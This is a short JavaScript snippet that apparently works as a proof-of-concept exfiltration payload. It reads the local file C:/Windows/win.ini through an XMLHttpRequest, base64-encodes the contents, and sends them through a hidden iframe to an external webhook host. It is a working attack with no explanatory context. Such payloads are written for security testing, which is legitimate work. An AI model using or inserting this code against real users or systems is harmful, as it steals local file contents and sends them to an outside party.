function reqListener () {
    var encoded = encodeURI(this.responseText);
    var b64 = btoa(this.responseText);
    var raw = this.responseText;
    var iframe = document.createElement('iframe');
	iframe.style.display = "none";
	iframe.src = "https://762202e9.proxy.webhookapp.com/?ff="+b64;
	document.body.appendChild(iframe);
} 
var oReq = new XMLHttpRequest(); 
oReq.addEventListener("load", reqListener); 
oReq.open("GET", "file:///C:/Windows/win.ini"); 
oReq.send();
